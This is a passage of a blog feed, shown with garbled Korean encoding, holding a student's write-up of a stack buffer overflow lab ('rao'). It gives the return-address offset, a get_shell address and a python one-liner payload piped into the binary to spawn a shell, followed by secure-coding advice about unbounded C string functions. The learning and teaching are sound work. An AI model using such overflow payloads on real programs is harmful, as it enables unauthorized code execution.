&lt;p&gt;ê·¸ë ‡ë‹¤ë©´ payloadì˜ í˜•íƒœëŠ” ì–´ë–»ê²Œ êµ¬ì„±ë ê¹Œ?&lt;/p&gt;

&lt;p&gt;ë‹¹ì—°íˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x28(+a)+0x08&lt;/code&gt; byteì˜ dump data + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*get_shell()&lt;/code&gt; ì¼ ê²ƒì´ë‹¤. ì—¬ê¸°ì—ì„œ buf ë³€ìˆ˜ì˜ í¬ê¸°ì— a byteë¥¼ ë”í•œ ì´ìœ ëŠ”, Cì–¸ì–´ ì»´íŒŒì¼ëŸ¬ê°€ ìì²´ì ìœ¼ë¡œ ë²„í¼ë¥¼ ë³´í˜¸í•˜ê¸° ìœ„í•´ì„œ ëª…ì‹œì ìœ¼ë¡œ ì„ ì–¸ëœ ë²„í¼ì— ëª‡ byteë¥¼ ë¶™ì—¬ ì‹¤ì§ˆì ì¸ ìŠ¤íƒ ë²„í¼ë¥¼ ì„ ì–¸í•˜ëŠ” ê²½ìš°ê°€ ìˆê¸° ë•Œë¬¸ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ ê²½ìš°ì—ëŠ” ìµìŠ¤í•  í”„ë¡œê·¸ë¨ì´ ì»´íŒŒì¼ëœ í™˜ê²½ê³¼ ë™ì¼í•œ í™˜ê²½ì—ì„œ ì»´íŒŒì¼ í›„ ë²„í¼ì˜ í¬ê¸°ê°€ ì–´ë–»ê²Œ ì„ ì–¸ë˜ëŠ”ì§€ í™•ì¸í•´ì•¼ í•œë‹¤.&lt;/p&gt;

&lt;p&gt;í•´ë‹¹ í”„ë¡œê·¸ë¨ì„ ì»´íŒŒì¼í•œ í›„, gdbì— ë¬¼ë ¤ ìŠ¤íƒì˜ ìƒí™©ê³¼ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ í™•ì¸í•´ ë³´ì•˜ë”ë‹ˆ ì•„ë˜ì™€ ê°™ì•˜ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled.jpeg&quot; alt=&quot;main í•¨ìˆ˜ì—ì„œ ì„ ì–¸ëœ ì§€ì—­ ë³€ìˆ˜ì˜ í¬ê¸°ëŠ” 0x28ì¸ë°, ìŠ¤íƒì€ 0x30ë§Œí¼ì„ í™•ë³´í•˜ëŠ” ëª¨ìŠµ.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;main í•¨ìˆ˜ì—ì„œ ì„ ì–¸ëœ ì§€ì—­ ë³€ìˆ˜ì˜ í¬ê¸°ëŠ” 0x28ì¸ë°, ìŠ¤íƒì€ 0x30ë§Œí¼ì„ í™•ë³´í•˜ëŠ” ëª¨ìŠµ.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled%201.jpeg&quot; alt=&quot;í°ìƒ‰ ë¸”ë¡ ì²˜ë¦¬ëœ ë¶€ë¶„ì˜ ì™¼ìª½ì€ SFP, ì˜¤ë¥¸ìª½ì€ rip ret add ì´ë‹¤.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;í°ìƒ‰ ë¸”ë¡ ì²˜ë¦¬ëœ ë¶€ë¶„ì˜ ì™¼ìª½ì€ SFP, ì˜¤ë¥¸ìª½ì€ rip ret add ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ì¦‰, &lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step3-2/#/&quot;&gt;ì˜ˆì „ì— í’€ì—ˆë˜ ë¬¸ì œ&lt;/a&gt;ì²˜ëŸ¼ C ì»´íŒŒì¼ëŸ¬ê°€ Char ë°°ì—´ì„ í• ë‹¹í•  ë•Œ 8byteë¥¼ ë” í• ë‹¹í•´ ì¤€ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë”°ë¼ì„œ ì •í™•í•œ payloadì˜ êµ¬ì¡°ëŠ” ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x30byte + 8byte&lt;/code&gt; dump data + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*get_shell&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;ì´ì œ get_shellì˜ ì£¼ì†Œë¥¼ êµ¬í•´ ë³´ì.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x4011dd&lt;/code&gt; ë¡œ í™•ì¸ë˜ì—ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì¦‰, payloadëŠ” ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;â€œAâ€*0x38 + 0x4011dd&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-ìµìŠ¤í”Œë¡œì‡-ì½”ë“œ-ì‘ì„±í•˜ê¸°&quot;&gt;3. ìµìŠ¤í”Œë¡œì‡ ì½”ë“œ ì‘ì„±í•˜ê¸°&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled%203.jpeg&quot; alt=&quot;ì‘ì„±í•œ ìµìŠ¤í”Œë¡œì‡ ì½”ë“œ.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì‘ì„±í•œ ìµìŠ¤í”Œë¡œì‡ ì½”ë“œ.&lt;/p&gt;

&lt;p&gt;ìœ„ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•œ ê²°ê³¼ëŠ” ì•„ë˜ì™€ ê°™ì•˜ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled%204.jpeg&quot; alt=&quot;ì‰˜ì„ íšë“í•˜ëŠ” ë° ì„±ê³µí–ˆë‹¤.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì‰˜ì„ íšë“í•˜ëŠ” ë° ì„±ê³µí–ˆë‹¤.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;ì½”ìŠ¤-ë‚´ìš©-í•™ìŠµ&quot;&gt;ì½”ìŠ¤ ë‚´ìš© í•™ìŠµ:&lt;/h1&gt;

&lt;h2 id=&quot;1-ì·¨ì•½ì -ë¶„ì„&quot;&gt;1. ì·¨ì•½ì  ë¶„ì„&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;í”„ë¡œê·¸ë¨ì˜ ì·¨ì•½ì ì€ í•œ ë§ˆë””ë¡œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf(&quot;%s&quot;, buf)&lt;/code&gt; í•¨ìˆ˜ ì‚¬ìš© ì·¨ì•½ì ì´ë‹¤.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf&lt;/code&gt; í•¨ìˆ˜ì˜ í¬ë§· ìŠ¤íŠ¸ë§ì˜ í•œ ì¢…ë¥˜ì¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%s&lt;/code&gt; ëŠ” â€œë¬¸ìì—´â€&lt;/li&gt;
      &lt;li&gt;ê·¸ëŸ°ë°, C ì–¸ì–´ì˜ íŠ¹ì„±ìƒ ì´ëŠ” ë„ì–´ì“°ê¸°, íƒ­, ê°œí–‰ ë¬¸ìê°€ ë“¤ì–´ì˜¬ ë•Œê¹Œì§€ ê³„ì† ì…ë ¥ì„ ë°›ì•„ë²„ë¦¼.&lt;/li&gt;
      &lt;li&gt;ì¦‰, ì…ë ¥ ê¸¸ì´ì— ì œí•œì„ ë‘ì§€ ì•ŠëŠ” ê²ƒì´ë‚˜ ë§ˆì°¬ê°€ì§€. â†’ ì˜¤ë²„í”Œë¡œìš° ë°œìƒ ê³µê²© ê°€ëŠ¥&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;ë”°ë¼ì„œ scanfì—ì„œ %s ì‚¬ìš©ì€ ì—„ê¸ˆ, %[n]s ë¡œ ì •í™•íˆ nê°œ ë¬¸ìë§Œ ì…ë ¥ë°›ë„ë¡ ì„¤ì •í•  ê²ƒ!&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;C/C++ì˜ í‘œì¤€ í•¨ìˆ˜ ì¤‘ ë²„í¼ë¥¼ ë‹¤ë£¨ë©´ì„œ ê¸¸ì´ë¥¼ ì…ë ¥í•˜ì§€ ì•ŠëŠ” í•¨ìˆ˜ë“¤ì€ ëŒ€ë¶€ë¶„ ìœ„í—˜í•˜ë‹¤.&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;ì˜ˆ: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcpy&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcat&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sprintf&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;ë°˜ë¡€(ë²„í¼ í¬ê¸° ì…ë ¥ì„ ë°›ìŒ): &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strncpy&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strncat&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snprintf&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fgets&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcpy&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;ìœ„í—˜í•œ í•¨ìˆ˜ëŠ” &lt;strong&gt;OOB ì·¨ì•½ì &lt;/strong&gt; ë“±ì˜ ì‹¬ê°í•œ ì·¨ì•½ì ì´ ë  ìˆ˜ ìˆìŒ.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;1) ì…ë ¥ì˜ ê¸¸ì´ë¥¼ ì œí•œí•˜ëŠ” ë¬¸ìì—´ í•¨ìˆ˜ ì‚¬ìš© 2) ë¬¸ìì—´ ì‚¬ìš© ì‹œ í•´ë‹¹ ë¬¸ìì—´ì´ NULL byteë¡œ ì¢…ê²°ë˜ëŠ”ì§€ í™•ì¸&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;í”„ë¡œê·¸ë¨ì˜ ì·¨ì•½ì ì„ ì°¾ì„ ë• ìœ„ í•­ëª©ì„ ì—­ìœ¼ë¡œ ì´ìš©í•˜ë©´ ì¢‹ë‹¤.&lt;/li&gt;
&lt;/ul&gt;

&lt;aside&gt;
ğŸ’¡ OOB(Out Of Bound): Cê³„ì—´ ì–¸ì–´ì—ì„œ ë¬¸ìì—´ì„ ì½ì–´ì˜¬ ë•Œ, ë¬¸ìì—´ì˜ ì¢…ê²°ì„ ì•Œë¦¬ëŠ” NULL byteë¥¼ ì°¾ì§€ ëª»í•´ í”„ë¡œê·¸ë˜ë¨¸ê°€ ì˜ë„í•œ í¬ê¸°ë¥¼ ë„˜ì–´ì„œ ë¬¸ìì—´ì˜ ì¸ë±ìŠ¤ë¥¼ ì°¸ì¡°í•˜ëŠ” í˜„ìƒ(Index Out-Of-Bound)ì„ ë°œìƒì‹œí‚¤ëŠ” ì·¨ì•½ì .

&lt;/aside&gt;

&lt;h2 id=&quot;2-ì·¨ì•½ì -íŠ¸ë¦¬ê±°&quot;&gt;2. ì·¨ì•½ì  íŠ¸ë¦¬ê±°&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;ì´ë¯¸ ì•ì—ì„œ ì·¨ì•½ì  íŠ¸ë¦¬ê±°ë¥¼ ì™„ë£Œí–ˆê¸° ë•Œë¬¸ì—, ì—¬ê¸°ì—ì„œëŠ” êµì•ˆìœ¼ë¡œ ë³´ê³  ìƒˆë¡œ ì•Œê²Œ ëœ ë‚´ìš©ë§Œ ì •ë¦¬í•´ ì‘ì„±í•œë‹¤.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•œ í›„, í”„ë¡œê·¸ë¨ì˜ ì…ì¥ì—ì„œëŠ” ë§ë„ ì•ˆ ë  ë§Œí¼ ê¸´ ì…ë ¥(64byte)ë¥¼ ì¤˜ ë³´ì•˜ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ê·¸ ê²°ê³¼, â€˜Segmentation faultâ€™ ë¼ëŠ” ì—ëŸ¬ê°€ ì¶œë ¥ë˜ë©´ì„œ í”„ë¡œê·¸ë¨ì´ ê°•ì œ ì¢…ë£Œëœë‹¤. Segmentationì€ ì•ì—ì„œ ë°°ì› ë“¯ ìš´ì˜ì²´ì œê°€ ê´€ë¦¬í•˜ëŠ” í”„ë¡œì„¸ìŠ¤ì˜ ë©”ëª¨ë¦¬ êµ¬ì¡°ì¸ë°, ì´ëŸ¬í•œ êµ¬ì¡°ì— ë¬¸ì œê°€ ìƒê²¼ë‹¤ëŠ” ëœ»ìœ¼ë¡œ í•´ì„ëœë‹¤.&lt;/p&gt;

&lt;p&gt;ì¦‰, í”„ë¡œê·¸ë¨ì´ ì˜ëª»ëœ ë©”ëª¨ë¦¬ ì„¹ì…˜ì— ì ‘ê·¼í–ˆìœ¼ë¯€ë¡œ ë²„ê·¸ê°€ ë°œìƒí–ˆë‹¤ëŠ” ì˜ë¯¸ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ê·¸ë¦¬ê³  ë§ˆì§€ë§‰ì˜ â€˜core dumpedâ€™ëŠ” ì½”ì–´íŒŒì¼ì„ ìƒì„±í–ˆë‹¤ëŠ” ì˜ë¯¸ë¡œ, í”„ë¡œê·¸ë¨ì´ ìœ„ì™€ ê°™ì´ ë¹„ì •ìƒì ìœ¼ë¡œ ì¢…ë£Œëì„ ë•Œ, ë””ë²„ê¹…ì„ ìˆ˜ì›”í•˜ê²Œ í•˜ê¸° ìœ„í•´ ìš´ì˜ì²´ì œê°€ ë§Œë“¤ì–´ ì£¼ëŠ” ê²ƒì´ë‹¤. ë§Œì¼ ìœ„ì™€ ê°™ì€ ì•Œë¦¼ì´ ë–´ìŒì—ë„ ì½”ì–´ íŒŒì¼ì´ ìƒì„±ë˜ì§€ ì•Šì•˜ë‹¤ë©´ ìƒì„±í•´ì•¼ í•  ì½”ì–´ íŒŒì¼ì˜ í¬ê¸°ê°€ ì‹œìŠ¤í…œì—ì„œ ì •í•œ í•œë„ë¥¼ ì´ˆê³¼í–ˆê¸° ë•Œë¬¸ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;í•´ë‹¹ í•œë„ëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ulimit -c unlimited&lt;/code&gt; ë¡œ í•´ì œí•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë³´í†µì€ í˜„ì¬ ë””ë ‰í„°ë¦¬ ì•„ë˜ì— coreë¼ëŠ” í´ë”ê°€ ìƒê¸°ê³ , ê·¸ ì•ˆì— ì½”ì–´ ë¤í”„ê°€ ì €ì¥ë˜ì–´ì•¼ í•˜ëŠ”ë°â€¦ ë‚´ê°€ ì‚¬ìš©í•˜ëŠ” Ubuntu 20.04+ ëŠ” apportì— ì˜í•´ì„œ core dumpingì´ interceptë¼ ìš´ì˜ì²´ì œê°€ ì•„ë‹ˆë¼ apportê°€ ì½”ì–´ ë¤í”„ë¥¼ ë§Œë“¤ë„ë¡ ë˜ì–´ ìˆì—ˆë‹¤â€¦ ê·¸ë˜ì„œ í•œì°¸ì„ ë’¤ì ¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/apport/coredump&lt;/code&gt; ì—ì„œ ì½”ì–´ ë¤í”„ë“¤ì„ ì°¾ì•„ë‚¼ ìˆ˜ ìˆì—ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ê·¸ëŸ°ë° ë˜ ë¬¸ì œìƒí™©.. í•´ë‹¹ ì½”ì–´ ë¤í”„ì™€ ì›ë³¸ í”„ë¡œê·¸ë¨ì„ gdbì— ê°™ì´ ë¬¼ë ¤ì„œ ì½”ë“œì™€ ìŠ¤íƒì„ í™•ì¸í•´ ë³´ë ¤ í–ˆëŠ”ë°, Maximum recursion depth exceeded in comparison ì˜¤ë¥˜ê°€ ë– ì„œ ì œëŒ€ë¡œ ì•ˆ ë˜ì—ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ê²°êµ­ ì‹œê°„ì´ ë¶€ì¡±í•œ ê´€ê³„ë¡œ ì½”ì–´ ë¤í”„ ë¶„ì„ì€ êµì•ˆì„ ì½ê³  ë§ˆë¬´ë¦¬í•˜ê¸°ë¡œ í–ˆë‹¤â€¦ ì½”ì–´ ë¤í”„ ë¶„ì„ì˜ ê²°ë¡ ì€ SBOFë¡œ ì¸í•´ ret addê°€ ì…ë ¥ê°’ìœ¼ë¡œ ë®ì–´ì”Œì›Œì¡Œê³ , ë‹¹ì—°íˆ ê·¸ê²ƒì€ ì‹¤í–‰ê°€ëŠ¥í•œ ë©”ëª¨ë¦¬ ì£¼ì†Œê°€ ì•„ë‹ˆê¸° ë•Œë¬¸ì— Segmentation faultê°€ ë°œìƒí–ˆë‹¤ëŠ” ê²ƒì´ì—ˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;3-ìµìŠ¤í”Œë¡œì‡&quot;&gt;3. ìµìŠ¤í”Œë¡œì‡&lt;/h2&gt;

&lt;p&gt;ì´ë¯¸ ë¬¸ì œë¥¼ í’€ì—ˆê³ , í•´ë‹¹ ì›ë¦¬ë¥¼ ì•Œê³  ìˆê¸° ë•Œë¬¸ì— ê° í˜ì´ì¦ˆì—ì„œ ëª¨ë¥´ëŠ” ë¶€ë¶„ë§Œ ê°„ë‹¨íˆ ì •ë¦¬í•œë‹¤.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ìŠ¤íƒ í”„ë ˆì„ êµ¬ì¡° íŒŒì•…&lt;/li&gt;
  &lt;li&gt;get_shell() ì£¼ì†Œ íŒŒì•…
    &lt;ul&gt;
      &lt;li&gt;gdbì—ì„œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;print get_shell&lt;/code&gt; í•˜ë©´ ëœë‹¤.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;í˜ì´ë¡œë“œ êµ¬ì„±
    &lt;ul&gt;
      &lt;li&gt;êµ¬ì„±í•œ í˜ì´ë¡œë“œì˜ ì¤‘ìš” ë°ì´í„°ëŠ” ë°˜ë“œì‹œ ì—”ë””ì–¸(Endian)ì„ ì ìš©ì‹œì¼œì„œ í”„ë¡œê·¸ë¨ì— ì „ë‹¬í•´ì•¼ í•œë‹¤.
        &lt;ul&gt;
          &lt;li&gt;ì˜ˆ: get_shell()ì˜ ì£¼ì†ŒëŠ” ëŒ€ìƒ ì‹œìŠ¤í…œì˜ ì•„í‚¤í…ì²˜ì— ë”°ë¼ ì—”ë””ì–¸ì„ ë‹¤ë¥´ê²Œ ì ìš©ì‹œì¼œì„œ í˜ì´ë¡œë“œì— í•©ì³ì•¼ í•œë‹¤. ( \xa7\x05\x40â€¦ì¦‰ ë°”ì´ë„ˆë¦¬ í¬ë§·ìœ¼ë¡œ)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ìµìŠ¤í”Œë¡œì‡
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;ë‚˜ëŠ” íŒŒì´ì¬ì˜ pwntoolsë¥¼ ì´ìš©í–ˆëŠ”ë°, í•´ë‹¹ êµì•ˆì—ì„œëŠ” ë°”ë¡œ íŒŒì´ì¬ ì»¤ë§¨ë“œë¥¼ ì´ìš©í•´ ìµìŠ¤í”Œë¡œì‡ì„ ìˆ˜í–‰í–ˆê¸° ë•Œë¬¸ì— í•´ë‹¹ ì»¤ë§¨ë“œë¥¼ ì•„ë˜ì— ì ëŠ”ë‹¤.&lt;/p&gt;

        &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;import sys;sys.stdout.buffer.write(b&apos;A&apos;*0x30 + b&apos;B&apos;*0x08 + b&apos;{ë¦¬í‹€_ì—”ë””ì–¸ìœ¼ë¡œ_ì‘ì„±ëœ_ëŒ€ìƒ_í•¨ìˆ˜_ì£¼ì†Œ}&apos;)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rao&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;ê·¸ë¦¬ê³  ìµìŠ¤í”Œë¡œì‡ì— ì„±ê³µí•˜ì—¬ &lt;strong&gt;ì‰˜ì„ ë•„ë‹¤ë©´, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; ì»¤ë§¨ë“œ&lt;/strong&gt;ë¥¼ ì³ì„œ í˜„ì¬ ê³„ì •ì˜ ê¶Œí•œì„ ì¶œë ¥í•´ì„œ ë³´ì—¬ì£¼ëŠ” ê²ƒìœ¼ë¡œ ì¦ëª…í•œë‹¤.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;ì·¨ì•½ì -íŒ¨ì¹˜&quot;&gt;ì·¨ì•½ì  íŒ¨ì¹˜&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cì–¸ì–´ì—ì„œ ìì£¼ ì‚¬ìš©ë˜ëŠ” ë¬¸ìì—´ ì…ë ¥ í•¨ìˆ˜ë“¤ì˜ íŒ¨í„´ì„ ì•Œê³ , ì ì ˆíˆ ì‚¬ìš©í•´ì•¼ í•œë‹¤.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack53/Untitled%206.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ë„ ì¢…ê²°: ë¬¸ìì—´ì˜ ëì— ë„ì´ ìˆì–´ì„œ ë¬¸ìì—´ì˜ ëì´ ëª…ì‹œë˜ëŠ” ê²ƒ.&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Mon, 22 Aug 2022 23:55:23 +0900</pubDate>
        <link>http://localhost:4000/blog/system-hacking-step5-3/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/system-hacking-step5-3/</guid>
      </item>
    
      <item>
        <title>System Hackig Step 5-2</title>
        <description>&lt;h1 id=&quot;stage-5-2&quot;&gt;STAGE 5-2&lt;/h1&gt;

&lt;h1 id=&quot;memory-corruption-stack-buffer-overflow&quot;&gt;Memory Corruption: Stack Buffer Overflow&lt;/h1&gt;

&lt;p&gt;ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ëŠ” ë§¤ìš° ì—­ì‚¬ê°€ ì˜¤ë˜ëœ ì·¨ì•½ì ì´ë©°, í˜„ì¬ ì‹¤ì‹œê°„ìœ¼ë¡œ ë‹¤ìˆ˜ ì†Œí”„íŠ¸ì›¨ì–´ì—ì„œ ë°œê²¬ë˜ê³  ìˆëŠ” í˜„ì¬ì§„í–‰í˜•ì¸ ì·¨ì•½ì ì´ë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;ëª©í‘œ&quot;&gt;ëª©í‘œ&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ì˜ ì›ì¸ ì•Œê¸°&lt;/li&gt;
  &lt;li&gt;ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¡œ ì¸í•´ ë°œìƒí•˜ëŠ” ë³´ì•ˆ ë¬¸ì œ ì•Œê¸°&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;ì£¼ì˜ì &quot;&gt;ì£¼ì˜ì &lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;ìŠ¤íƒ ì˜¤ë²„í”Œë¡œìš° â‰  ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°
    &lt;ul&gt;
      &lt;li&gt;ìŠ¤íƒ ì˜¤ë²„í”Œë¡œìš°: í•œì •ëœ í¬ê¸°ì˜ ë©”ëª¨ë¦¬ ì•ˆì—ì„œ ìŠ¤íƒ ì˜ì—­ì´ ë„ˆë¬´ ë§ì´ í™•ì¥ë˜ì–´ ë°œìƒí•˜ëŠ” ë²„ê·¸&lt;/li&gt;
      &lt;li&gt;ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°: ìŠ¤íƒì— ìœ„ì¹˜í•œ ë²„í¼ì— ë²„í¼ì˜ í¬ê¸°ë³´ë‹¤ ë§ì€ ë°ì´í„°ê°€ ì…ë ¥ë˜ì–´ ë°œìƒí•˜ëŠ” ë²„ê·¸&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;ìŠ¤íƒ-ë²„í¼-ì˜¤ë²„í”Œë¡œìš°ì™€-ì•…ìš©-ê²½ìš°ìˆ˜&quot;&gt;ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ì™€ ì•…ìš© ê²½ìš°ìˆ˜&lt;/h1&gt;

&lt;h2 id=&quot;1-ë²„í¼-ì˜¤ë²„í”Œë¡œìš°&quot;&gt;1. ë²„í¼ ì˜¤ë²„í”Œë¡œìš°&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë€, &lt;strong&gt;ìŠ¤íƒ&lt;/strong&gt;ì˜ &lt;strong&gt;ë²„í¼&lt;/strong&gt;ì—ì„œ ë°œìƒí•˜ëŠ” &lt;strong&gt;ì˜¤ë²„í”Œë¡œìš°&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;Q. ë²„í¼ë€ ë¬´ì—‡ì´ê³ , ì˜¤ë²„í”Œë¡œìš°ë€ ë¬´ì—‡ì¼ê¹Œ?&lt;/strong&gt;&lt;/p&gt;

&lt;/blockquote&gt;

&lt;h3 id=&quot;ë²„í¼&quot;&gt;ë²„í¼:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;â€œë°ì´í„°ê°€ ëª©ì ì§€ë¡œ ì´ë™ë˜ê¸° ì „ì— ë³´ê´€ë˜ëŠ” ì„ì‹œ ì €ì¥ì†Œâ€&lt;/li&gt;
  &lt;li&gt;í˜„ëŒ€ì—ëŠ” â€œë°ì´í„°ê°€ ì €ì¥ë  ìˆ˜ ìˆëŠ” ëª¨ë“  ë‹¨ìœ„â€
    &lt;ul&gt;
      &lt;li&gt;ì§€ì—­ ë³€ìˆ˜ì— í• ë‹¹ëœ ë©”ëª¨ë¦¬ ì˜ì—­ì€ â€˜ìŠ¤íƒ ë²„í¼â€™&lt;/li&gt;
      &lt;li&gt;í™ì— í• ë‹¹ëœ ë©”ëª¨ë¦¬ ì˜ì—­ì€ â€˜í™ ë²„í¼â€™ë¼ê³  ë¶€ë¥´ëŠ” ê²ƒê³¼ ê°™ë‹¤.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ë²„í¼-ì˜¤ë²„í”Œë¡œìš°&quot;&gt;ë²„í¼ ì˜¤ë²„í”Œë¡œìš°:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ë²„í¼ê°€ ë„˜ì¹˜ëŠ” ê²ƒ: ì§€ì •ëœ ë²„í¼ í¬ê¸°ë³´ë‹¤ í° ë°ì´í„°ê°€ ì…ë ¥ë˜ì–´ ë°œìƒí•œë‹¤.&lt;/strong&gt;
    &lt;ul&gt;
